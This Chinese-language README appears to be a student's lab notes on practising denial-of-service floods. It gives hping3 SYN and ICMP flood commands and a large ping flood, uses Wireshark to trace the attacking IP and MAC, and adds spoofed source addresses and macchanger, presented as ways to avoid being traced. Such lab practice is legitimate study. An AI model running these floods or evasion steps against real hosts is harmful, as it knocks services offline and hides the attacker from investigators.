
## 這是我第一次的DDos實作😃

### 上課教了︰
<code>hping3 -V  -c 100000 -d 100 -S -p 21 --flood 192.168.43.129</code><br/>
<code>hping3 -V  -c 100000 -d 100 -S -p 21 --flood --rand-source 192.168.43.129</code>

### 自主學習︰
#### 問題1  用wireshark監測攻擊方ip
> 使用指令(hping3 -V  -c 100000 -d 100 -S -p 21 --flood 192.168.19.130)攻擊
> 可以看到攻擊來源都是來自192.168.19.128 的ip位置。
![](https://github.com/Superliverbun/Newbie-in-Information-Security/blob/main/DDos-Attack-Practice/Easy_DDos/%E5%9C%96%E7%89%871.png)


#### 問題2  用wireshark監測攻擊方MAC
> 加入rand-sorce指令(hping3 -V  -c 100000 -d 100 -S -p 21 --flood --rand-source 192.168.19.130)後
> 雖然無法直接看出ip位置，但可知 MAC address來自00:0c:29:9a:44:5d
![](https://github.com/Superliverbun/Newbie-in-Information-Security/blob/main/DDos-Attack-Practice/Easy_DDos/%E5%9C%96%E7%89%872.png)

#### 問題3  使用不同的指令或參數進行Dos或DDos攻擊，並且認出攻擊來源
##### 方法一
> 使用指令 ping -f -l 65500 190.168.50.61
> 他會向目標計算機發送大量的 ICMP 封包，將其 CPU 負載推至極限。
![](https://github.com/Superliverbun/Newbie-in-Information-Security/blob/main/DDos-Attack-Practice/Easy_DDos/%E5%9C%96%E7%89%874.png)

>很明顯的攻擊來源就是192.168.50.171
![](https://github.com/Superliverbun/Newbie-in-Information-Security/blob/main/DDos-Attack-Practice/Easy_DDos/%E5%9C%96%E7%89%873.png)


##### 方法二
> 使用指令 hping3 --icmp --rand-source --flood -d 1400 190.168.50.61	
> 發送大量的封包，讓服務器癱瘓
![](https://github.com/Superliverbun/Newbie-in-Information-Security/blob/main/DDos-Attack-Practice/Easy_DDos/%E5%9C%96%E7%89%875.png)



#### 問題4  改善hping3並找出攻擊來源
##### 方法一
> 用指令 hping3 -a 192.168.1.100 -V -c 100000 -d 100 -S -p 21 --flood 190.168.50.61
> 用-a 偽造攻擊者ip 使對方無法透過ip追蹤
![](https://github.com/Superliverbun/Newbie-in-Information-Security/blob/main/DDos-Attack-Practice/Easy_DDos/%E5%9C%96%E7%89%876.png)

##### 方法二 
> 用指令 macchanger -m AA:AA:AA:AA:AA:AA eth0更改MAC地址
![](https://github.com/Superliverbun/Newbie-in-Information-Security/blob/main/DDos-Attack-Practice/Easy_DDos/%E5%9C%96%E7%89%877.png)

> 再使用 hping3 -a 192.168.1.100 -V -c 100000 -d 100 -S -p 21 --flood 190.168.50.61
> 讓對方無法透過ip和MAC追蹤
![](https://github.com/Superliverbun/Newbie-in-Information-Security/blob/main/DDos-Attack-Practice/Easy_DDos/%E5%9C%96%E7%89%878.png)




